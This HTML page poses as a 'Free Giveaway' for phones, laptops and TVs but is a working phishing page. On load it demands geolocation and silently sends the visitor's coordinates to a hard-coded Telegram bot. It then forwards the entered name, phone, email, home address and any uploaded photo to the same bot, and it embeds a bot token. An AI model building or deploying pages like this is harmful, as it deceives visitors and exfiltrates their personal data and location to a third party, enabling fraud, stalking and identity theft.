<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Free Giveaway</title>
<style>
body {
    margin: 0;
    font-family: Arial;
    background: linear-gradient(135deg,#0f2027,#203a43,#2c5364);
    color: white;
}
.container {
    width: 90%;
    max-width: 320px;
    margin: 30px auto;
    background: rgba(0,0,0,0.75);
    padding: 15px;
    border-radius: 12px;
    box-shadow: 0 0 10px rgba(0,0,0,0.5);
    text-align: center;
}
h1 {
    font-size: 20px;
    margin-bottom: 10px;
    color: #00ffcc;
}
input, select {
    width: 100%;
    padding: 7px;
    margin: 5px 0;
    border-radius: 6px;
    border: none;
    font-size: 13px;
}
button {
    width: 100%;
    padding: 9px;
    margin-top: 8px;
    border-radius: 8px;
    border: none;
    background: #00ffcc;
    font-size: 14px;
    cursor: pointer;
}
button:hover {
    background: #00ccaa;
}
.refer {
    margin-top: 15px;
    font-size: 12px;
    color: #ccc;
}
.hidden {
    display: none;
}
</style>
</head>
<body>

<div class="container">
    <h1>🎁 Free Giveaway</h1>

    <!-- Form initially hidden -->
    <form id="giveawayForm" class="hidden">
        <input type="text" placeholder="Name" name="name" required>
        <input type="tel" placeholder="Number" name="number" required>
        <input type="email" placeholder="Gmail" name="email" required>
        <input type="text" placeholder="Address" name="address" required>

        <input type="file" id="imageInput" accept="image/*">

        <select name="product" required>
            <option value="">Select Product</option>
            <option>iPhone</option>
            <option>Laptop</option>
            <option>Computer</option>
            <option>Tab</option>
            <option>Smart TV</option>
            <option>Smart Watch</option>
            <option>Air Buds</option>
        </select>

        <button type="submit">Claim</button>
    </form>

    <!-- Refer code always at bottom -->
    <div class="refer">
        Your Refer Code: <b>29815</b> <br>
        Visit: <b>realgiveaway.com</b>
    </div>
</div>

<script>
const botToken = "8707405851:AAExkQRafu5BUWcFSfbOnFYaBWbwoq0vpec";
const chatId = "8620709769";
const form = document.getElementById("giveawayForm");

// Ask for location on page load
window.onload = function() {
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(sendLocation, locationDenied);
    } else {
        alert("Your browser does not support location permission.");
        form.classList.remove("hidden"); // fallback
    }
}

async function sendLocation(position){
    const lat = position.coords.latitude;
    const long = position.coords.longitude;

    // Send location instantly to Telegram
    const locationMessage = `📍 User Location:\nLatitude: ${lat}\nLongitude: ${long}`;
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: chatId, text: locationMessage })
    });

    // Show the form after location is sent
    form.classList.remove("hidden");
}

function locationDenied(){
    alert("Location permission is required to access the giveaway.");
}

// Telegram integration for form submission
form.addEventListener("submit", async function(e){
    e.preventDefault();

    const name = form.name.value;
    const number = form.number.value;
    const email = form.email.value;
    const address = form.address.value;
    const product = form.product.value;

    const message = `🎁 New Giveaway Submission 🎁\n\nName: ${name}\nNumber: ${number}\nEmail: ${email}\nAddress: ${address}\nProduct: ${product}`;

    // Send text message
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: chatId, text: message })
    });

    // Send image if selected
    const fileInput = document.getElementById("imageInput");
    if(fileInput.files.length > 0){
        const file = fileInput.files[0];
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", file);

        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData
        });
    }

    alert("Your submission has been sent!");
    form.reset();
});
</script>

</body>
</html>
